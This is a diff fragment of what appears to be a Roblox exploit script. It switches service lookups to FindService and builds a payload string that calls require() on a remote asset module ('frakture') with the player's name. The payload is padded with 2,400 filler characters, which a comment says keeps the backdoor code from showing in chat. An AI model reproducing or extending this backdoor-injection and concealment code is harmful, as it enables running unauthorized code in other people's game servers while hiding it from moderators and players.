@@ -5,12 +5,12 @@ local taskSpawn = task.spawn
 local taskWait = task.wait
 local stringRep = string.rep
 
-local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local JointsService = game:GetService("JointsService")
-local StarterGui = game:GetService("StarterGui")
+local RobloxReplicatedStorage = game:FindService("RobloxReplicatedStorage")
+local ReplicatedStorage = game:FindService("ReplicatedStorage")
+local JointsService = game:FindService("JointsService")
+local StarterGui = game:FindService("StarterGui")
 
-local LocalPlayer = game:GetService("Players").LocalPlayer
+local LocalPlayer = game:FindService("Players").LocalPlayer
 local requireScript = ("require(8913865946).frakture('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
 local invCode = "w8SkzPz9qQ"
 
